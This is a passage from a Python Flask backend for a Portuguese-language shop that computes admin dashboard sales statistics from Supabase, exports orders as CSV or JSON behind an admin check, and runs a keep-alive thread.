        produtos_stats_response = supabase.table(PRODUCTS_TABLE).select('*', count='exact').eq('ativo', True).execute()
        total_produtos = produtos_stats_response.count if hasattr(produtos_stats_response, 'count') else 0
        
        categorias_stats_response = supabase.table(CATEGORIAS_TABLE).select('*', count='exact').eq('ativo', True).execute()
        total_categorias = categorias_stats_response.count if hasattr(categorias_stats_response, 'count') else 0
        
        # Vendas do dia
        hoje_str = hoje.isoformat()
        amanha = hoje + timedelta(days=1)
        amanha_str = amanha.isoformat()
        vendas_hoje_response = supabase.table(PEDIDOS_TABLE).select('valor_total').gte('timestamp', hoje_str).lt('timestamp', amanha_str).execute()
        vendas_hoje = sum(float(pedido['valor_total'] or 0) for pedido in vendas_hoje_response.data)
        
        # Vendas da semana (últimos 7 dias)
        semana_inicio = hoje - timedelta(days=7)
        semana_str = semana_inicio.isoformat()
        vendas_semana_response = supabase.table(PEDIDOS_TABLE).select('valor_total').gte('timestamp', semana_str).lt('timestamp', amanha_str).execute()
        vendas_semana = sum(float(pedido['valor_total'] or 0) for pedido in vendas_semana_response.data)
        
        # Vendas do mês
        mes_inicio = hoje.replace(day=1)
        mes_str = mes_inicio.isoformat()
        vendas_mes_response = supabase.table(PEDIDOS_TABLE).select('valor_total').gte('timestamp', mes_str).lt('timestamp', amanha_str).execute()
        vendas_mes = sum(float(pedido['valor_total'] or 0) for pedido in vendas_mes_response.data)
        
        # Ticket médio
        average_ticket = total_vendas / total_pedidos if total_pedidos > 0 else 0
        
        return jsonify({
            'total_pedidos': total_pedidos,
            'total_vendas': total_vendas,
            'vendas_hoje': vendas_hoje,
            'total_produtos': total_produtos,
            'total_categorias': total_categorias,
            'status_counts': status_counts,
            'top_produtos': top_produtos,
            'vendas_por_dia': vendas_por_dia,
            'today_sales': vendas_hoje,
            'week_sales': vendas_semana,
            'month_sales': vendas_mes,
            'average_ticket': average_ticket
        }), 200
        
    except Exception as e:
        print(f"Erro no admin_dashboard_produtos: {e}")
        return jsonify({
            'total_pedidos': 0,
            'total_vendas': 0,
            'vendas_hoje': 0,
            'total_produtos': 0,
            'total_categorias': 0,
            'status_counts': {},
            'top_produtos': [],
            'vendas_por_dia': [],
            'today_sales': 0,
            'week_sales': 0,
            'month_sales': 0,
            'average_ticket': 0
        }), 500

# --- ROTA PARA EXPORTAR PEDIDOS DE PRODUTOS ---

@app.route('/api/admin/export/pedidos/produtos', methods=['GET'])
@admin_required
def export_pedidos_produtos():
    """Exporta pedidos de produtos em diferentes formatos"""
    try:
        if not supabase_connected:
            return jsonify({'message': 'Banco de dados não conectado.'}), 500
        
        format_type = request.args.get('format', 'csv')
        
        # Buscar todos os dados com informações dos produtos
        response = supabase.table(PEDIDOS_TABLE).select('*').order('timestamp', desc=True).execute()
        pedidos = response.data
        
        # Adicionar informações dos produtos
        for pedido in pedidos:
            produto = get_product_by_id(pedido.get('produto_id'))
            if produto:
                pedido['produto_nome'] = produto.get('nome', '')
                pedido['produto_preco'] = produto.get('preco', 0)
        
        if format_type == 'csv':
            output = io.StringIO()
            writer = csv.writer(output, delimiter=',', quotechar='"', quoting=csv.QUOTE_MINIMAL)
            
            # Cabeçalho
            if pedidos and len(pedidos) > 0:
                headers = ['ID', 'Código Rastreio', 'Data/Hora', 'Cliente', 'Telefone', 
                          'Produto', 'Quantidade', 'Valor Total', 'Status', 'Endereço',
                          'Observação', 'Comentário']
                writer.writerow(headers)
                
                # Dados
                for row in pedidos:
                    writer.writerow([
                        row.get('id', ''),
                        row.get('codigo_rastreio', ''),
                        row.get('timestamp', ''),
                        row.get('nome', ''),
                        row.get('telefone', ''),
                        row.get('produto_nome', ''),
                        row.get('quantidade', ''),
                        row.get('valor_total', ''),
                        row.get('status', ''),
                        row.get('endereco', ''),
                        row.get('observacao', ''),
                        row.get('comentario', '')
                    ])
            
            output.seek(0)
            return Response(
                output.getvalue(),
                mimetype='text/csv',
                headers={'Content-Disposition': f'attachment; filename=pedidos_produtos_{datetime.now().strftime("%Y%m%d_%H%M%S")}.csv'}
            )
            
        elif format_type == 'json':
            return jsonify(pedidos), 200
            
        else:
            return jsonify({'message': 'Formato não suportado.'}), 400
            
    except Exception as e:
        print(f"Erro no export_pedidos_produtos: {e}")
        return jsonify({'message': 'Falha ao exportar dados.'}), 500

# Função para manter servidor ativo
def keep_alive():
    """Função periódica para manter servidor ativo"""
    while True:
        time.sleep(300)  # 5 minutos
        try:
            if supabase_connected:
                supabase.table('config').select('id').limit(1).execute()
        except:
            pass

# Inicializar variável de tempo
app_start_time = time.time()

if __name__ == '__main__':
    # Iniciar thread para manter servidor ativo
    keep_alive_thread = threading.Thread(target=keep_alive, daemon=True)
    keep_alive_thread.start()
    
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
